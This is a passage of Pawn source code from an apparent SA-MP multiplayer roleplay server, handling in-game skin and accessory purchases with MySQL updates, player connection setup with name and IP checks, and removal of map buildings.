            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist2)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist3)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist4)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist5)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist6)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist8)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist9)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist10)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist11)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist12)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);

            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist13)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    if(listid == skinlist14)
    {
        if(response)
        {
            SetPlayerSkin(playerid, modelid);
            PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d',`Model`='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pModel], PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    return 1;
}

public OnPlayerModelSelectionEx(playerid, response, extraid, modelid)
{
    if(extraid == 1)
    {
        if(response)
        {
            new skin,string[256];
            skin = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
			Sunglasses[playerid] = 1;
            PlayerInfo[playerid][pGlasses] = modelid;
            Update(playerid, pGlassesx);
            SetPlayerHoldingObject(playerid, modelid, 2, SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    else if(extraid == 2)
    {
        if(response)
        {
            new skin,string[256];
            skin = GetPlayerSkin(playerid);
            GivePlayerCash(playerid,-5000);
            mysql_format(SQL, string, sizeof(string), "UPDATE users SET Money='%d' WHERE name='%s'", GetPlayerCash(playerid), PlayerInfo[playerid][pNormalName]);
      		mysql_tquery(SQL,string,"","");
			BizzInfo[InBussines[playerid]][bTill] += 5000;
			mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
			mysql_tquery(SQL,string,"","");
			Hatss[playerid] = 1;
            PlayerInfo[playerid][pHats] = modelid;
            Update(playerid, pHatsx);
            SetPlayerAttachedObject(playerid, 0, modelid, 2, SkinCaps[skin][0], SkinCaps[skin][1], SkinCaps[skin][2], SkinCaps[skin][3],SkinCaps[skin][4], SkinCaps[skin][5], 1.000000, 1.000000, 1.000000);
            GameTextForPlayer(playerid, "~r~-$5,000", 5000, 1);
        }
    }
    return 1;
}
// ONPLAYERCONNECT
public OnPlayerConnect(playerid)
{
	coliziuniactive[playerid] = -1;
	loginautomat[playerid] = 0;
	resetare_detectare_aimbot[playerid] = 30;
	ucideri_detectare_aimbot[playerid] = 0;
	boxawar[playerid] = -1;	
	problemalogin[playerid] = -1;
	AscundeTD[playerid] = -1;
	T_SAU_CT[playerid] = -1;
	incamerapaintball[playerid] = 0;
	timp_artificie[playerid] = 0;
	tog_admin[playerid] = 1;
	/*QuestTimer[playerid] = -1;
	for(new id = 0; id < sizeof(OMZapada); id++)
	{
		for(new id2 = 0; id2 < 9; id2++)
		{
			Omdezapada[playerid][id][id2] = -1;
		}
	}*/
	suma_bani_trade[playerid] = 0;
	pregatit_trade[playerid] = 0;
	in_afacere_cu[playerid] = -1;
	invitatie_trade[playerid] = -1;
	partitie_trade[playerid] = 0;
	for(new i = 0; i < 15; i++) { vehicule[i][playerid] = 0; }
	casa_trade[playerid] = 0;
	afacere_trade[playerid] = 0;
	iteme_adaugate[playerid] = 0;
	kickplayer[playerid] = -1;
	snowActive[playerid] = 0;
	BanCheck(playerid);
	WantedReason[playerid] = 0;
	Radaron[playerid] = 0;
	Radarlimit[playerid] = 0;
	MP3ON[playerid] = 0;
	for(new i = 0; i < 4; i++) JCurier[playerid][i] = -1;
	for(new i = 0; i < 3; i++) JCiment[playerid][i] = -1;
	for(new i = 0; i < 3; i++) JCariera[playerid][i] = -1;
	bugobiecte[playerid] = -1;
	timereferral[playerid] = -1;
	vipchat[playerid] = 1;
    arefreeze[playerid] = 0;
	rotiredailybonus[playerid] = -1;
	timercasatorie[playerid] = -1;
	incwar[playerid] = 0;
	mortcwar[playerid] = 0;
	invitatiecattack[playerid] = -1;
	limitabanuri[playerid] = -1;
	banuriinminut[playerid] = 0;
	loginautomat[playerid] = 0;
	folosirespawnchange[playerid] = 0;
	bonus5ore[playerid] = 0;
	timerkeno[playerid] = -1;
	MizaKeno[playerid] = -1;
	CumparaSkin[playerid] = 0;
	for(new i = 0; i < 100; i++) PRETSKIN[i][playerid] = 0, IDSKIN[i][playerid] = 0;
	coliziunipns[playerid] = 0;
	TonomatTime[playerid] = -1;
	sendbankkick[playerid] = -1;
	actorbanca[playerid] = -1;
	banirob[playerid] = -1;
	RobTimer[playerid] = -1;
	InTunning[playerid] = 0;
	OnFly[playerid] = false;
	RefuelTime[playerid] = -1;
	timercuvantcheie[playerid] = -1;
	securitatenr[playerid] = 0;
	Securitate[playerid] = 0;
	racingcar[playerid] = -1;
	p_ac[playerid] = 0;
	DSCAR[playerid] = -1;
   	adaugarebonus[playerid] = -1;
   	atminterogare[playerid] = -1;
   	atmretragere[playerid] = -1;
   	atmtransfer[playerid] = -1;
   	secundepanalaad[playerid] = -1;
   	esteinATM[playerid] = -1;
   	accestransfer[playerid] = -1;
   	esteinds[playerid] = -1;
   	afolositgetpp[playerid] = 0;
   	botmember[playerid] = 0;
   	wait5sec[playerid] = -1;
   	timerreport[playerid] = -1;
   	citeste10sec[playerid] = -1;
   	freetimer[playerid] = -1;
	for(new i; i<sizeof(TLD); i++)
    {
        new string[256];
        new Nick[MAX_PLAYER_NAME];
        GetPlayerName(playerid, Nick, sizeof(Nick));
        if(!strcmp(Nick, TLD[i], true))
        {
            SendClientMessage(playerid, COLOR_ERROR, "You were disconnected from the server because of an invalid name.");
            format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s It was disconnected from the server because it has a name invalid.", Nick);
            ABroadCast(COLOR_AdminWarn,string,1);
            KickEx(playerid);
			return 1;
        }
    }
	new Nick[MAX_PLAYER_NAME];
	GetPlayerName(playerid, Nick, sizeof(Nick));
	if(FindIP(Nick))
	{
		new string[256];
		SendClientMessage(playerid, COLOR_ERROR, "You were disconnected from the server because of an invalid name.");
        format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s It was disconnected from the server because it has a name invalid.", Nick);
        ABroadCast(COLOR_AdminWarn,string,1);
		KickEx(playerid);
		return 1;
	}
	new playerip[20];
	GetPlayerIp(playerid, playerip, sizeof(playerip));
	GetPlayerIp(playerid, playerip, sizeof(playerip));
    if(NumIp(playerip, playerid) >= 2)
	{
		SendClientMessage(playerid, COLOR_ERROR, "There are already 1 player connected with same IP.");
		KickEx(playerid);
 		return 1;
	}
	//for(new i = 0; i < 18; i++) TextDrawShowForPlayer(playerid, LoginTD[i]);
	lastquestion[playerid] = -1;
	timefornextquestion[playerid] = -1;
	aprimitintrebarea[playerid] = -1;
    sarmale[playerid] = 0;
    AntiFlood_InitPlayer( playerid );
	XDeaths[playerid] = 0;
    LastDeath[playerid] = 0;
    pnsmoney[playerid] = 0;
    OnDutymedic[playerid] = 0;
    cased[playerid] = 0;
    caser[playerid] = 1001;
    RepairTime[playerid] = 0;
    Tigaanel[playerid] = 0;
    LastPlayer[playerid] = -1;
    PlayerInfo[playerid][pNRE] = -1;
    payala[playerid] = 0;

 	if(antirem[playerid] == 0)
 	{
 		antirem[playerid] = 1;
 	}

	// * RemoveBuildingForPlayer * //
	if(antirem[playerid] == 1)
	{
		gPlayerCitySelection[playerid] = -1;
		gPlayerHasCitySelected[playerid] = 0;
		gPlayerLastCitySelectionTick[playerid] = GetTickCount();
				/////nr
		RemoveBuildingForPlayer(playerid, 1689, 745.5859, -1381.1094, 25.8750, 0.25);
RemoveBuildingForPlayer(playerid, 1689, 751.3359, -1368.0313, 25.8750, 0.25);
RemoveBuildingForPlayer(playerid, 6516, 717.6875, -1357.2813, 18.0469, 0.25);
RemoveBuildingForPlayer(playerid, 1415, 732.8516, -1332.8984, 12.6875, 0.25);
RemoveBuildingForPlayer(playerid, 1439, 732.7266, -1341.7734, 12.6328, 0.25);
		//=============================== Muncitor in Cariera =========================//
		RemoveBuildingForPlayer(playerid, 5575, 1919.5234, -1400.8984, 16.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 1907.4922, -1353.4063, 20.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 1978.1484, -1371.1484, 31.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 708, 1966.7109, -1360.0938, 17.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1971.8203, -1411.8750, 14.2500, 0.25);
		RemoveBuildingForPlayer(playerid, 5390, 1919.5234, -1400.8984, 16.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 5663, 1919.4453, -1400.8828, 19.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 1958.8828, -1395.1953, 13.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 5400, 1913.1328, -1370.5000, 17.7734, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 1933.2422, -1376.1719, 13.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 1907.5000, -1353.4063, 20.0547, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 1978.1484, -1371.1484, 31.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 5660, 1916.0547, -1426.2422, 16.0313, 0.25);
		//==================================== VINEWOOD =================================//
		RemoveBuildingForPlayer(playerid, 13759, 1413.414, -804.742, 83.437, 0.250);
		RemoveBuildingForPlayer(playerid, 13722, 1413.414, -804.742, 83.437, 0.250);
		RemoveBuildingForPlayer(playerid, 13831, 1413.414, -804.742, 83.437, 0.250);
		RemoveBuildingForPlayer(playerid, 620, 1483.375, -855.328, 58.421, 0.250);
		// ======================================= SPAWN ===============================//
		RemoveBuildingForPlayer(playerid, 6463, 389.7734, -2028.4688, 19.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 6464, 379.0625, -2065.0234, 11.7969, 0.25);
		RemoveBuildingForPlayer(playerid, 6465, 368.0547, -2028.2422, 8.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2028.5000, 32.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2021.6406, 29.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2017.4531, 24.0313, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2017.4297, 16.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2021.6328, 10.9844, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2028.5156, 8.7813, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3984, 10.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2039.6406, 16.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2039.6563, 24.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3828, 29.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 1529, 399.0078, -2066.8828, 11.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 353.0156, -2081.1875, 6.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 353.0156, -2050.4844, 6.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 364.6094, -2036.1797, 9.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 6462, 368.0547, -2028.2422, 8.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 6466, 374.6953, -2054.8828, 8.7031, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 374.7969, -2046.9375, 9.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 378.4609, -2012.9297, 7.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 381.0313, -2070.9375, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 6283, 379.0625, -2065.0234, 11.7969, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2055.1016, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2042.4922, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2030.3359, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2016.7500, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 386.5703, -2049.3516, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1340, 388.8594, -2071.6641, 7.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2039.6406, 16.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2039.6563, 24.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 6298, 389.7734, -2028.4688, 19.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 6461, 389.7734, -2028.5000, 20.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5000, 32.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2021.6406, 29.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2017.4531, 24.0313, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2017.4297, 16.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2021.6328, 10.9844, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5156, 8.7813, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2035.3984, 10.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2035.3828, 29.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 400.7578, -2081.1875, 6.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 400.7578, -2050.4844, 6.5938, 0.25);
		//TUNNINGURI
		RemoveBuildingForPlayer(playerid, 10575, -2716.3516, 217.4766, 5.3828, 0.25);  // SF - Wheel Arch Angels
		RemoveBuildingForPlayer(playerid, 11313, -1935.8594, 239.5313, 35.3516, 0.25); // SF - TransFender
		RemoveBuildingForPlayer(playerid, 9093, 2386.6563, 1043.6016, 11.5938, 0.25); // LV - TransFender
		RemoveBuildingForPlayer(playerid, 5779, 1041.3516, -1025.9297, 32.6719, 0.25); // LS - TransFender
		RemoveBuildingForPlayer(playerid, 5340, 2644.8594, -2039.2344, 14.0391, 0.25); // LS - Loco Low Co.
		// ---------------------------LSPD MAPA-------------------------------------
		RemoveBuildingForPlayer(playerid, 4063, 1578.4688, -1676.4219, 13.0703, 0.25);
		RemoveBuildingForPlayer(playerid, 4064, 1571.6016, -1675.7500, 35.6797, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 1538.5234, -1609.8047, 19.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 1565.4141, -1722.3125, 25.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 4229, 1597.9063, -1699.7500, 30.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 4230, 1597.9063, -1699.7500, 30.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 1565.4141, -1722.3125, 25.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1541.4453, -1713.3047, 14.4297, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1541.4531, -1709.6406, 13.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1541.2969, -1702.6016, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1546.6016, -1693.3906, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1689.9844, 13.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1546.8672, -1687.1016, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 646, 1545.5234, -1678.8438, 14.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 646, 1553.8672, -1677.7266, 16.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 646, 1553.8672, -1673.4609, 16.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 646, 1545.5625, -1672.2188, 14.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1546.6016, -1664.6250, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1546.8672, -1658.3438, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1661.0313, 13.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 3975, 1578.4688, -1676.4219, 13.0703, 0.25);
		RemoveBuildingForPlayer(playerid, 3976, 1571.6016, -1675.7500, 35.6797, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1541.4766, -1648.4531, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1541.4531, -1642.0313, 13.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 647, 1541.7422, -1638.9141, 14.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 1538.5234, -1609.8047, 19.8438, 0.25);
	
		//DealerShip MAP #2
		RemoveBuildingForPlayer(playerid, 4563, 1567.6016, -1248.6953, 102.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 4566, 1567.6016, -1248.6953, 102.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 4698, 1574.5938, -1248.1016, 15.3984, 0.25);
		RemoveBuildingForPlayer(playerid, 4715, 1567.7188, -1248.6953, 102.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 1340, 1589.6953, -1287.2656, 17.6406, 0.25);
		RemoveBuildingForPlayer(playerid, 4562, 1574.5938, -1248.1016, 15.3984, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 1600.1641, -1260.7500, 19.1484, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 1600.1641, -1232.7500, 19.1484, 0.25);
	
	    RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);
	    RemoveBuildingForPlayer(playerid, 1226, 1624.6875, -2190.3750, 16.3125, 0.25);
		RemoveBuildingForPlayer(playerid, 17350, -54.9922, -1130.7266, 4.5781, 0.25);
		RemoveBuildingForPlayer(playerid, 1447, -89.9297, -1133.7500, 1.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, -87.0547, -1132.6797, 0.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 1462, -79.2500, -1137.7188, 0.0547, 0.25);
		RemoveBuildingForPlayer(playerid, 17072, -54.9922, -1130.7266, 4.5781, 0.25);
		RemoveBuildingForPlayer(playerid, 17073, -56.1250, -1130.1719, 4.4922, 0.25);
		RemoveBuildingForPlayer(playerid, 1462, -84.3750, -1116.0938, 0.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 1447, -84.0547, -1117.2188, 1.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 1415, -68.3516, -1104.9922, 0.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 1462, -60.3594, -1116.9375, 0.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, -63.6719, -1125.6953, 0.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, -63.4141, -1115.4141, 0.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 1415, -63.8125, -1106.4219, 0.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 3593, 2407.3125, -1418.3594, 23.6875, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 1789.2109, -1369.2656, 15.1641, 0.25);
		RemoveBuildingForPlayer(playerid, 956, 1634.1094, -2237.5313, 12.8906, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 1729.7891, -1943.0469, 12.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 2060.1172, -1897.6406, 12.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 956, 2480.8594, -1959.2734, 12.9609, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 1928.7344, -1772.4453, 12.9453, 0.25);
